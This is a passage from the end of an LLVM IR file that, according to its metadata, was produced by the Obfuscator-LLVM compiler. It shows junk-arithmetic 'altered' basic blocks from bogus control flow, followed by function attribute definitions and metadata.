  %gen = add i32 %_, 1
  %_7 = sub i32 0, %161
  %gen8 = add i32 %_7, 1
  %_9 = shl i32 %161, 1
  %162 = add nsw i32 %161, 1
  store i32 %162, i32* %5, align 4
  br label %originalBB6

originalBB13alteredBB:                            ; preds = %originalBB13, %91
  br label %originalBB13

originalBB17alteredBB:                            ; preds = %originalBB17, %110
  %163 = load i32, i32* %10, align 4
  %_18 = sub i32 %163, 1
  %gen19 = mul i32 %_18, 1
  %_20 = sub i32 0, %163
  %gen21 = add i32 %_20, 1
  %_22 = sub i32 %163, 1
  %gen23 = mul i32 %_22, 1
  %_24 = shl i32 %163, 1
  %164 = add nsw i32 %163, 1
  store i32 %164, i32* %10, align 4
  br label %originalBB17

originalBB29alteredBB:                            ; preds = %originalBB29, %130
  %165 = load i32, i32* %5, align 4
  br label %originalBB29
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146816818}
!2 = !{i32 -2146816409}
